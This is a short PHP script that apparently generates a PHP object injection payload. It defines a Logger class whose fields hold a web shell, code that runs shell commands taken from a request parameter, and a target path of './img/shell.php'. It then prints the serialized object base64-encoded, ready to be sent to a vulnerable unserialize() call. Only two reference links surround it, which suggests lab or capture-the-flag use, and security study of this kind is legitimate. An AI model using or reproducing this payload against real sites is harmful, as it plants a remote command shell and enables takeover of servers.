<?php
# Ref: http://php.net/manual/en/function.unserialize.php
#      https://www.owasp.org/index.php/PHP_Object_Injection
#

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct($file){
        $this->exitMsg = '<? $cmd = $_REQUEST["-cmd"]; if($cmd != "") print Shell_Exec($cmd);?>';
        $this->logFile = "./img/shell.php";
    }
}

print base64_encode(serialize(new Logger));


?>
